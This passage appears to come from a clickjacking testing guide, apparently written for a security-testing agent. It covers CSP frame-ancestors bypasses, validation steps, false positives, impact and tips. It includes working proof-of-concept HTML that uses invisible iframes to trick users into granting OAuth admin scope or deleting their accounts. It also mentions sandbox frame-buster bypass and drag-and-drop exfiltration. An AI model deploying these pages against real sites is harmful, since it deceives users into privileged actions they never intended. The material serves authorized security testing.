<csp_bypass>
{% raw %}
# frame-ancestors bypass scenarios

# Overly permissive wildcards
frame-ancestors *.example.com  # Subdomain takeover = bypass
frame-ancestors https://*      # Any HTTPS site

# Parser differential
# Some browsers parse frame-ancestors differently

# Missing on specific pages
# Check if all sensitive pages have protection
{% endraw %}
</csp_bypass>
</bypass_techniques>

<exploitation_scenarios>
<oauth_clickjacking>
{% raw %}
# Trick user into granting OAuth permissions

<!DOCTYPE html>
<html>
<body>
    <h1>Login to continue</h1>
    <button>Click to Login</button>
    <iframe style="opacity: 0.0001; position: absolute;"
            src="https://accounts.google.com/o/oauth2/auth?...&scope=admin">
    </iframe>
</body>
</html>
{% endraw %}
</oauth_clickjacking>

<account_deletion>
{% raw %}
# Two-step clickjacking for account deletion

# Step 1: Navigate to delete page via first click
# Step 2: Confirm deletion via second click

<!DOCTYPE html>
<html>
<body>
    <h1>Play our game!</h1>
    <button id="button1" onclick="step2()">Click 1</button>
    <button id="button2" style="display:none" onclick="step3()">Click 2</button>
    
    <iframe id="frame" style="opacity: 0.0001; position: absolute;"
            src="https://target.com/settings/delete">
    </iframe>
    
    <script>
        function step2() {
            document.getElementById('button1').style.display = 'none';
            document.getElementById('button2').style.display = 'block';
            document.getElementById('frame').src = 'https://target.com/settings/delete/confirm';
        }
    </script>
</body>
</html>
{% endraw %}
</account_deletion>
</exploitation_scenarios>

<validation>
1. Confirm missing or misconfigured X-Frame-Options/CSP frame-ancestors.
2. Create working PoC demonstrating sensitive action via click hijacking.
3. Show the attack works against real functionality (not just embedding).
4. Demonstrate user interaction leads to unintended privileged action.
5. Test across multiple browsers to confirm consistent vulnerability.
</validation>

<false_positives>
- Pages without sensitive clickable actions
- Read-only pages with no state-changing operations
- Proper X-Frame-Options or frame-ancestors in place
- JavaScript frame busters that cannot be bypassed
- CSRF tokens required for state-changing actions
</false_positives>

<impact>
- Unauthorized actions on behalf of victim
- OAuth permission grants to attacker apps
- Account settings modification
- Fund transfers or purchases
- Social engineering amplification
- Data exfiltration via drag-and-drop
- Permission grants (camera, microphone, location)
</impact>

<pro_tips>
1. Always check for BOTH X-Frame-Options AND CSP frame-ancestors.
2. Test sensitive pages individually - protection may be inconsistent.
3. Use browser DevTools to verify framing behavior.
4. Multi-step actions require multi-click PoCs.
5. Mobile browsers may have different protections - test specifically.
6. OAuth authorization pages are high-value clickjacking targets.
7. Drag-and-drop attacks can exfiltrate selected text content.
8. sandbox attribute can bypass JavaScript frame busters.
9. Combine with social engineering for realistic attack scenarios.
10. Check if SameSite cookies provide additional protection.
</pro_tips>

<remember>Clickjacking transforms visible UI into a deception layer. Defense requires proper HTTP headers (X-Frame-Options and CSP frame-ancestors), CSRF tokens for state changes, and user confirmation for sensitive operations. Always create realistic PoCs that demonstrate actual security impact.</remember>
</clickjacking_guide>
